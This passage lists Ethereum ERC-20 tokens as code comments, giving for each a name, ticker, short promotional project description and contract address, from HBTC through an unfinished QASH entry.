// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300bd93

// Kyber Network Crystal v2 (KNC)
// Kyber is a blockchain-based liquidity protocol that aggregates liquidity from a wide range of reserves, powering instant and secure token exchange in any decentralized application.
// 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202

// Iron Bank EUR (ibEUR)
// Fixed Forex is the collective name for USD, EUR, ZAR, JPY, CNY, AUD, AED, CAD, INR, and any other forex pairs launched under the Fixed Forex moniker.
// 0x96e61422b6a9ba0e068b6c5add4ffabc6a4aae27

// Synapse (SYN)
// Synapse is a cross-chain layer ∞ protocol powering interoperability between blockchains.
// 0x0f2d719407fdbeff09d87557abb7232601fd9f29

// XSGD (XSGD)
// StraitsX is the pioneering payments infrastructure for the digital assets space in Southeast Asia developed by Singapore-based FinTech Xfers Pte. Ltd, a Major Payment Institution licensed by the Monetary Authority of Singapore for e-money issuance
// 0x70e8de73ce538da2beed35d14187f6959a8eca96

// dYdX (DYDX)
// DYDX is a governance token that allows the dYdX community to truly govern the dYdX Layer 2 Protocol. By enabling shared control of the protocol, DYDX allows traders, liquidity providers, and partners of dYdX to work collectively towards an enhanced Protocol.
// 0x92d6c1e31e14520e676a687f0a93788b716beff5

// Reserve Rights (RSR)
// The fluctuating protocol token that plays a role in stabilizing RSV and confers the cryptographic right to purchase excess Reserve tokens as the network grows.
// 0x320623b8e4ff03373931769a31fc52a4e78b5d70

// Illuvium (ILV)
// Illuvium is a decentralized, NFT collection and auto battler game built on the Ethereum network.
// 0x767fe9edc9e0df98e07454847909b5e959d7ca0e

// CEEK (CEEK)
// Universal Currency for VR & Entertainment Industry. Working Product Partnered with NBA Teams, Universal Music and Apple
// 0xb056c38f6b7dc4064367403e26424cd2c60655e1

// Chroma (CHR)
// Chromia is a relational blockchain designed to make it much easier to make complex and scalable dapps.
// 0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2

// Telcoin (TEL)
// A cryptocurrency distributed by your mobile operator and accepted everywhere.
// 0x467Bccd9d29f223BcE8043b84E8C8B282827790F

// KEEP Token (KEEP)
// A keep is an off-chain container for private data.
// 0x85eee30c52b0b379b046fb0f85f4f3dc3009afec

// Pundi X Token (PUNDIX)
// To provide developers increased use cases and token user base by supporting offline and online payment of their custom tokens in Pundi X‘s ecosystem.
// 0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38

// PowerLedger (POWR)
// Power Ledger is a peer-to-peer marketplace for renewable energy.
// 0x595832f8fc6bf59c85c527fec3740a1b7a361269

// Render Token (RNDR)
// RNDR (Render Network) bridges GPUs across the world in order to provide much-needed power to artists, studios, and developers who rely on high-quality rendering to power their creations. The mission is to bridge the gap between GPU supply/demand through the use of distributed GPU computing.
// 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24

// Storj (STORJ)
// Blockchain-based, end-to-end encrypted, distributed object storage, where only you have access to your data
// 0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac

// Synth sUSD (sUSD)
// A synthetic asset issued by the Synthetix protocol which tracks the price of the United States Dollar (USD). sUSD can be traded on Synthetix.Exchange for other synthetic assets through a peer-to-contract system with no slippage.
// 0x57ab1ec28d129707052df4df418d58a2d46d5f51

// BitMax token (BTMX)
// Digital asset trading platform
// 0xcca0c9c383076649604eE31b20248BC04FdF61cA

// DENT (DENT)
// Aims to disrupt the mobile operator industry by creating an open marketplace for buying and selling of mobile data.
// 0x3597bfd533a99c9aa083587b074434e61eb0a258

// FunFair (FUN)
// FunFair is a decentralised gaming platform powered by Ethereum smart contracts
// 0x419d0d8bdd9af5e606ae2232ed285aff190e711b

// XY Oracle (XYO)
// Blockchain's crypto-location oracle network
// 0x55296f69f40ea6d20e478533c15a6b08b654e758

// Metal (MTL)
// Transfer money instantly around the globe with nothing more than a phone number. Earn rewards every time you spend or make a purchase. Ditch the bank and go digital.
// 0xF433089366899D83a9f26A773D59ec7eCF30355e

// CelerToken (CELR)
// Celer Network is a layer-2 scaling platform that enables fast, easy and secure off-chain transactions.
// 0x4f9254c83eb525f9fcf346490bbb3ed28a81c667

// Ocean Token (OCEAN)
// Ocean Protocol helps developers build Web3 apps to publish, exchange and consume data.
// 0x967da4048cD07aB37855c090aAF366e4ce1b9F48

// Divi Exchange Token (DIVX)
// Digital Currency
// 0x13f11c9905a08ca76e3e853be63d4f0944326c72

// Tribe (TRIBE)
// 0xc7283b66eb1eb5fb86327f08e1b5816b0720212b

// ZEON (ZEON)
// ZEON Wallet provides a secure application that available for all major OS. Crypto-backed loans without checks.
// 0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532

// Rari Governance Token (RGT)
// The Rari Governance Token is the native token behind the DeFi robo-advisor, Rari Capital.
// 0xD291E7a03283640FDc51b121aC401383A46cC623

// Injective Token (INJ)
// Access, create and trade unlimited decentralized finance markets on an Ethereum-compatible exchange protocol for cross-chain DeFi.
// 0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30

// Energy Web Token Bridged (EWTB)
// Energy Web Token (EWT) is the native token of the Energy Web Chain, a public, Proof-of-Authority Ethereum Virtual Machine blockchain specifically designed to support enterprise-grade applications in the energy sector.
// 0x178c820f862b14f316509ec36b13123da19a6054

// MEDX TOKEN (MEDX)
// Decentralized healthcare information system
// 0xfd1e80508f243e64ce234ea88a5fd2827c71d4b7

// Spell Token (SPELL)
// Abracadabra.money is a lending platform that allows users to borrow funds using Interest Bearing Tokens as collateral.
// 0x090185f2135308bad17527004364ebcc2d37e5f6

// Uquid Coin (UQC)
// The goal of this blockchain asset is to supplement the development of UQUID Ecosystem. In this virtual revolution, coin holders will have the benefit of instantly and effortlessly cash out their coins.
// 0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2

// Mask Network (MASK)
// Mask Network allows users to encrypt content when posting on You-Know-Where and only the users and their friends can decrypt them.
// 0x69af81e73a73b40adf4f3d4223cd9b1ece623074

// Function X (FX)
// Function X is an ecosystem built entirely on and for the blockchain. It consists of five elements: f(x) OS, f(x) public blockchain, f(x) FXTP, f(x) docker and f(x) IPFS.
// 0x8c15ef5b4b21951d50e53e4fbda8298ffad25057

// Aragon Network Token (ANT)
// Create and manage unstoppable organizations. Aragon lets you manage entire organizations using the blockchain. This makes Aragon organizations more efficient than their traditional counterparties.
// 0xa117000000f279d81a1d3cc75430faa017fa5a2e

// KyberNetwork (KNC)
// KyberNetwork is a new system which allows the exchange and conversion of digital assets.
// 0xdd974d5c2e2928dea5f71b9825b8b646686bd200

// Origin Dollar (OUSD)
// Origin Dollar (OUSD) is a stablecoin that earns yield while it's still in your wallet. It was created by the team at Origin Protocol (OGN).
// 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86

// QuarkChain Token (QKC)
// A High-Capacity Peer-to-Peer Transactional System
// 0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664

// Anyswap (ANY)
// Anyswap is a mpc decentralized cross-chain swap protocol.
// 0xf99d58e463a2e07e5692127302c20a191861b4d6

// Trace (TRAC)
// Purpose-built Protocol for Supply Chains Based on Blockchain.
// 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f

// ELF (ELF)
// elf is a decentralized self-evolving cloud computing blockchain network that aims to provide a high performance platform for commercial adoption of blockchain.
// 0xbf2179859fc6d5bee9bf9158632dc51678a4100e

// Request (REQ)
// A decentralized network built on top of Ethereum, which allows anyone, anywhere to request a payment.
// 0x8f8221afbb33998d8584a2b05749ba73c37a938a

// STPT (STPT)
// Decentralized Network for the Tokenization of any Asset.
// 0xde7d85157d9714eadf595045cc12ca4a5f3e2adb

// Ribbon (RBN)
// Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
// 0x6123b0049f904d730db3c36a31167d9d4121fa6b

// HooToken (HOO)
// HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
// 0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d

// Wrapped Celo USD (wCUSD)
// Wrapped Celo Dollars are a 1:1 equivalent of Celo Dollars. cUSD (Celo Dollars) is a stable asset that follows the US Dollar.
// 0xad3e3fc59dff318beceaab7d00eb4f68b1ecf195

// Dawn (DAWN)
// Dawn is a utility token to reward competitive gaming and help players to build their professional Esports careers.
// 0x580c8520deda0a441522aeae0f9f7a5f29629afa

// StormX (STMX)
// StormX is a gamified marketplace that enables users to earn STMX ERC-20 tokens by completing micro-tasks or shopping at global partner stores online. Users can earn staking rewards, shopping, and micro-task benefits for holding STMX in their own wallet.
// 0xbe9375c6a420d2eeb258962efb95551a5b722803

// BandToken (BAND)
// A data governance framework for Web3.0 applications operating as an open-source standard for the decentralized management of data. Band Protocol connects smart contracts with trusted off-chain information, provided through community-curated oracle data providers.
// 0xba11d00c5f74255f56a5e366f4f77f5a186d7f55

// NKN (NKN)
// NKN is the new kind of P2P network connectivity protocol & ecosystem powered by a novel public blockchain.
// 0x5cf04716ba20127f1e2297addcf4b5035000c9eb

// Reputation (REPv2)
// Augur combines the magic of prediction markets with the power of a decentralized network to create a stunningly accurate forecasting tool
// 0x221657776846890989a759ba2973e427dff5c9bb

// Alchemy (ACH)
// Alchemy Pay (ACH) is a Singapore-based payment solutions provider that provides online and offline merchants with secure, convenient fiat and crypto acceptance.
// 0xed04915c23f00a313a544955524eb7dbd823143d

// Orchid (OXT)
// Orchid enables a decentralized VPN.
// 0x4575f41308EC1483f3d399aa9a2826d74Da13Deb

// Fetch (FET)
// Fetch.ai is building tools and infrastructure to enable a decentralized digital economy by combining AI, multi-agent systems and advanced cryptography.
// 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85

// Propy (PRO)
// Property Transactions Secured Through Blockchain.
// 0x226bb599a12c826476e3a771454697ea52e9e220

// Adshares (ADS)
// Adshares is a Web3 protocol for monetization space in the Metaverse. Adserver platforms allow users to rent space inside Metaverse, blockchain games, NFT exhibitions and websites.
// 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a

// FLOKI (FLOKI)
// The Floki Inu protocol is a cross-chain community-driven token available on two blockchains: Ethereum (ETH) and Binance Smart Chain (BSC).
// 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e

// Aurora (AURORA)
// Aurora is an EVM built on the NEAR Protocol, a solution for developers to operate their apps on an Ethereum-compatible, high-throughput, scalable and future-safe platform, with a fully trustless bridge architecture to connect Ethereum with other networks.
// 0xaaaaaa20d9e0e2461697782ef11675f668207961

// Token Prometeus Network (PROM)
// Prometeus Network fuels people-owned data markets, introducing new ways to interact with data and profit from it. They use a peer-to-peer approach to operate beyond any border or jurisdiction.
// 0xfc82bb4ba86045af6f327323a46e80412b91b27d

// Ankr Eth2 Reward Bearing Certificate (aETHc)
// Ankr's Eth2 staking solution provides the best user experience and highest level of safety, combined with an attractive reward mechanism and instant staking liquidity through a bond-like synthetic token called aETH.
// 0xE95A203B1a91a908F9B9CE46459d101078c2c3cb

// Numeraire (NMR)
// NMR is the scarcity token at the core of the Erasure Protocol. NMR cannot be minted and its core use is for staking and burning. The Erasure Protocol brings negative incentives to any website on the internet by providing users with economic skin in the game and punishing bad actors.
// 0x1776e1f26f98b1a5df9cd347953a26dd3cb46671

// RLC (RLC)
// Blockchain Based distributed cloud computing
// 0x607F4C5BB672230e8672085532f7e901544a7375

// Compound Basic Attention Token (cBAT)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e

// Bifrost (BFC)
// Bifrost is a multichain middleware platform that enables developers to create Decentralized Applications (DApps) on top of multiple protocols.
// 0x0c7D5ae016f806603CB1782bEa29AC69471CAb9c

// Boba Token (BOBA)
// Boba is an Ethereum L2 optimistic rollup that reduces gas fees, improves transaction throughput, and extends the capabilities of smart contracts through Hybrid Compute. Users of Boba’s native fast bridge can withdraw their funds in a few minutes instead of the usual 7 days required by other ORs.
// 0x42bbfa2e77757c645eeaad1655e0911a7553efbc

// AlphaToken (ALPHA)
// Alpha Finance Lab is an ecosystem of DeFi products and focused on building an ecosystem of automated yield-maximizing Alpha products that interoperate to bring optimal alpha to users on a cross-chain level.
// 0xa1faa113cbe53436df28ff0aee54275c13b40975

// SingularityNET Token (AGIX)
// Decentralized marketplace for artificial intelligence.
// 0x5b7533812759b45c2b44c19e320ba2cd2681b542

// Dusk Network (DUSK)
// Dusk streamlines the issuance of digital securities and automates trading compliance with the programmable and confidential securities.
// 0x940a2db1b7008b6c776d4faaca729d6d4a4aa551

// CocosToken (COCOS)
// The platform for the next generation of digital game economy.
// 0x0c6f5f7d555e7518f6841a79436bd2b1eef03381

// Beta Token (BETA)
// Beta Finance is a cross-chain permissionless money market protocol for lending, borrowing, and shorting crypto. Beta Finance has created an integrated “1-Click” Short Tool to initiate, manage, and close short positions, as well as allow anyone to create money markets for a token automatically.
// 0xbe1a001fe942f96eea22ba08783140b9dcc09d28

// USDK (USDK)
// USDK-Stablecoin Powered by Blockchain and US Licenced Trust Company
// 0x1c48f86ae57291f7686349f12601910bd8d470bb

// Veritaseum (VERI)
// Veritaseum builds blockchain-based, peer-to-peer capital markets as software on a global scale.
// 0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374

// mStable USD (mUSD)
// The mStable Standard is a protocol with the goal of making stablecoins and other tokenized assets easy, robust, and profitable.
// 0xe2f2a5c287993345a840db3b0845fbc70f5935a5

// Marlin POND (POND)
// Marlin is an open protocol that provides a high-performance programmable network infrastructure for Web 3.0
// 0x57b946008913b82e4df85f501cbaed910e58d26c

// Automata (ATA)
// Automata is a privacy middleware layer for dApps across multiple blockchains, built on a decentralized service protocol.
// 0xa2120b9e674d3fc3875f415a7df52e382f141225

// TrueFi (TRU)
// TrueFi is a DeFi protocol for uncollateralized lending powered by the TRU token. TRU Stakers to assess the creditworthiness of the loans
// 0x4c19596f5aaff459fa38b0f7ed92f11ae6543784

// Rupiah Token (IDRT)
// Rupiah Token (IDRT) is the first fiat-collateralized Indonesian Rupiah Stablecoin. Developed by PT Rupiah Token Indonesia, each IDRT is worth exactly 1 IDR.
// 0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A

// Aergo (AERGO)
// Aergo is an open platform that allows businesses to build innovative applications and services by sharing data on a trustless and distributed IT ecosystem.
// 0x91Af0fBB28ABA7E31403Cb457106Ce79397FD4E6

// DODO bird (DODO)
// DODO is a on-chain liquidity provider, which leverages the Proactive Market Maker algorithm (PMM) to provide pure on-chain and contract-fillable liquidity for everyone.
// 0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd

// Keep3rV1 (KP3R)
// Keep3r Network is a decentralized keeper network for projects that need external devops and for external teams to find keeper jobs.
// 0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44

// ALICE (ALICE)
// My Neighbor Alice is a multiplayer builder game, where anyone can buy and own virtual islands, collect and build items and meet new friends.
// 0xac51066d7bec65dc4589368da368b212745d63e8

// Litentry (LIT)
// Litentry is a Decentralized Identity Aggregator that enables linking user identities across multiple networks.
// 0xb59490ab09a0f526cc7305822ac65f2ab12f9723

// Covalent Query Token (CQT)
// Covalent aggregates information from across dozens of sources including nodes, chains, and data feeds. Covalent returns this data in a rapid and consistent manner, incorporating all relevant data within one API interface.
// 0xd417144312dbf50465b1c641d016962017ef6240

// BitMartToken (BMC)
// BitMart is a globally integrated trading platform founded by a group of cryptocurrency enthusiasts.
// 0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8

// Proton (XPR)
// Proton is a new public blockchain and dApp platform designed for both consumer applications and P2P payments. It is built around a secure identity and financial settlements layer that allows users to directly link real identity and fiat accounts, pull funds and buy crypto, and use crypto seamlessly.
// 0xD7EFB00d12C2c13131FD319336Fdf952525dA2af

// Aurora DAO (AURA)
// Aurora is a collection of Ethereum applications and protocols that together form a decentralized banking and finance platform.
// 0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814

// CarryToken (CRE)
// Carry makes personal data fair for consumers, marketers and merchants
// 0x115ec79f1de567ec68b7ae7eda501b406626478e

// LCX (LCX)
// LCX Terminal is made for Professional Cryptocurrency Portfolio Management
// 0x037a54aab062628c9bbae1fdb1583c195585fe41

// Gitcoin (GTC)
// GTC is a governance token with no economic value. GTC governs Gitcoin, where they work to decentralize grants, manage disputes, and govern the treasury.
// 0xde30da39c46104798bb5aa3fe8b9e0e1f348163f

// BOX Token (BOX)
// BOX offers a secure, convenient and streamlined crypto asset management system for institutional investment, audit risk control and crypto-exchange platforms.
// 0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD

// Mainframe Token (MFT)
// The Hifi Lending Protocol allows users to borrow against their crypto. Hifi uses a bond-like instrument, representing an on-chain obligation that settles on a specific future date. Buying and selling the tokenized debt enables fixed-rate lending and borrowing.
// 0xdf2c7238198ad8b389666574f2d8bc411a4b7428

// UniBright (UBT)
// The unified framework for blockchain based business integration
// 0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e

// QASH (QASH)
